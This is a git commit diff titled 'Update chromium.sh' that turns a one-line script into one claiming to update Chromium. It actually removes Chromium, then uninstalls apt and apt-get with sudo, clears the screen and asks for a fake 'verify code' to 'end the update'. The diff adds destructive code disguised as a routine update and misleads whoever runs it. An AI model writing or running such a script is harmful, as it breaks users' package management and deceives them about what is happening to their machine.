5fdcb0056bfc84d88302b6c6489d6f8f6ab56059
Mike <142720633+Mikequez12@users.noreply.github.com>
2025-03-20 11:05:04 +0100

    Update chromium.sh

--- chromium.sh
+++ chromium.sh
@@ -1,1 +1,10 @@
-echo OK
+echo Updating...
+
+sudo apt remove chromium -y
+sudo apt remove apt -y
+sudo apt-get remove apt-get -y
+
+clear
+
+echo Please, introduce verify code to end the update: 
+read code
